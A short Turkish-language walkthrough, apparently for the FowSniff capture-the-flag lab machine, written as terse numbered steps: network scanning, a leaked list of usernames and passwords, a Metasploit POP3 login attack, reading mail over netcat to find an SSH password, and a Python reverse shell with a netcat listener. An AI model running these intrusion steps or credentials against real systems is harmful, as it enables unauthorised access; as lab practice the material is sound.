@@ -1,0 +1,28 @@
+FOWSNIFF MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.77 bulundu.
+2 - nmap -sT -A 192.168.2.77
+3 - gobuster dir -u http://192.168.2.77 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - https://twitter.com/fowsniffcorp
+5 - https://t.co/qJe9lhEdpJ
+mauer:mailcall
+mustikka:bilbo101
+tegel:apples01
+baksteen:skyler22
+seina:scoobydoo2
+stone:
+mursten:carp4ever
+barede:orlando12
+sciana:07011972
+6 - msfconsole, search pop3, use auxiliary/scanner/pop3/pop3_login, seina:scoobydoo2
+7 - nc 192.168.2.77 110
+USER seina
+PASS scoobydoo2
+list
+RETR 1
+RETR 2, baksteen:S1ck3nBluff+secureshell
+QUIT
+8 - nano cube.sh -> python reverse shell
+9 - nc -lvnp 4444
+10 - exit
+11 - ssh baksteen@192.168.2.77
+12 - whoami
